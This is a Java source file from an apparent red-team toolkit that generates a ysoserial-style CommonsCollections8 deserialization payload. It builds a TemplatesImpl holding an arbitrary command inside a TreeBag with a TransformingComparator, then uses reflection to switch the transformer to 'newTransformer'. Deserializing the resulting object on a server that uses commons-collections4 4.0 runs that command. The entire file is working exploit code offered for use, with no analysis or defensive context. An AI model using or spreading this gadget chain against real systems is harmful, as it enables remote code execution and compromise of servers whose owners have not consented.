package com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads;

import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Authors;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.annotation.Dependencies;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Gadgets;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.PayloadRunner;
import com.potato.potatotool.content.redTeam.payload.yso.thirdparty.woodpecker.payloads.util.Reflections;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.NAVALORENZO})
public class CommonsCollections8 extends PayloadRunner implements ObjectPayload<TreeBag> {

    @Override
    public TreeBag getObject(final String command) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(command);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        TransformingComparator comparator = new TransformingComparator(transformer);

        TreeBag tree = new TreeBag(comparator);
        tree.add(templates);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        return tree;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections8.class, args);
    }
}
